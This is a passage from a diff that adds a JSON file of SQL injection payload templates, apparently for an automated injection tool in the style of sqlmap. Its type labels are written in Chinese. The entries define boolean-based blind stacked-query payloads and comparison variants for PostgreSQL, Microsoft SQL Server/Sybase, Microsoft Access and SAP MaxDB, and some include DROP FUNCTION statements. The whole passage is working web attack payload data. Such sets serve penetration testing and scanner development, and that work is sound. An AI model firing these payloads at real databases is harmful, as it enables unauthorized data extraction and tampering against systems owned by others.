+        "compare": ";SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1",
+        "dbms": "PostgreSQL",
+        "comment": "--"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - 堆叠查询（IF）",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]",
+        "compare": ";IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "comment": "--",
+        "os": "Windows"
+      },
+      {
+        "type": " Microsoft SQL Server/Sybase 布尔盲注 - 堆叠查询",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)",
+        "compare": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)",
+        "dbms": "Microsoft SQL Server/Sybase",
+        "comment": "--",
+        "os": "Windows"
+      },
+      {
+        "type": " Microsoft Access 布尔盲注 - 堆叠查询",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";IIF([RANDNUM]=[RANDNUM],1,1/0)",
+        "compare": ";IIF([RANDNUM]=[RANDNUM1],1,1/0)",
+        "dbms": "Microsoft Access",
+        "comment": "16%"
+      },
+      {
+        "type": " SAP MaxDB 布尔盲注 - 堆叠查询",
+        "where": 1,
+        "clause": [
+          1,
+          2,
+          3,
+          4,
+          5,
+          6,
+          7,
+          8
+        ],
+        "payload": ";SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END",
+        "compare": ";SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END",
+        "dbms": "SAP MaxDB",
+        "comment": "--"
+      }
+    ]
+  }
+}
